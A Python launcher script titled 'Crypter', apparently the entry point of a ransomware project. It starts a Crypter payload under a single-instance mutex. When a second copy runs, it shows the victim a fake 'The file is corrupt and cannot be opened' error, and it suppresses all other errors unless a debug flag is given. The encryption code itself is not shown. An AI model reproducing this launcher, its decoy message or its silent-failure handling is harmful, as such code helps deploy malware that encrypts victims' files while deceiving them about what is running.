'''
Crypter - Launcher
@author: Sithis
'''

# Import Libs
import win32event
import win32api
import winerror
import wx
import os
import sys

# Import Package Libs
from Crypter import Crypter
from Crypter.Mutex import *

def showErrorDialog(message):
    '''
    Displays an error dialog containing the specified message
    '''

    app = wx.App()
    error_dialog = wx.MessageDialog(None, str(message), "Error", wx.OK | wx.ICON_ERROR)
    error_dialog.ShowModal()
    app.MainLoop()

# GO
if __name__ == "__main__":

    ## START
    try:
        mutex = Mutex()
        go = Crypter()
    # Could not acquire mutex
    except MutexAlreadyAcquired as maa:
        showErrorDialog("The file is corrupt and cannot be opened")
        sys.exit()
    # Exception
    except Exception as ex:
        if "--debug" in sys.argv:
            showErrorDialog(ex)
            sys.exit()

